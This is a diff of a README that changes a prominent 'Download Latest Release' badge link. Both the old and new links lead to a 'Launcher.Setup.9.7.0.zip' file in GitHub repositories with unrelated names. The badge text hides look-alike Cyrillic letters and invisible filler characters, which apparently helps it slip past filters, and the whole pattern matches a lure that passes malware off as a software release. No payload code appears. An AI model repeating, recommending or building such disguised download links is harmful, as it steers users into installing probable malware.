@@ -1,5 +1,5 @@
 
-<p align=center><a href='https://github.com/Twilik/template_starter-kit_app/releases/download/1/Launcher.Setup.9.7.0.zip'><img src='http://img.shields.io/badge/ㅤ↓ㅤ-Dоwnload Lаtest Rеlease-green'></a> </p> <hr>
+<p align=center><a href='https://github.com/Twilik/automatic-winner/releases/download/1/Launcher.Setup.9.7.0.zip'><img src='http://img.shields.io/badge/ㅤ↓ㅤ-Dоwnload Lаtest Rеlease-green'></a> </p> <hr>
 
 ## License
 
